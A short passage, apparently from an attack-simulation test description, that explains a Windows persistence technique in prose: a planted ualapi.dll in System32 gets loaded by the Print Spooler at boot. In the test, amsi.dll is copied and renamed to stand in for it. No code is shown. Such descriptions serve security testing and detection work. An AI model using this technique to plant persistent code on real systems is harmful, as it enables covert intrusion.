    being loaded

    A malicious ualapi.dll placed in the System32 directory will lead to its execution
    whenever the system starts


    Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and
    then ualapi.dll will be copied to system32 folder for loading during system restart.

    Print Spooler service is also configured to auto start. Reboot of system is required
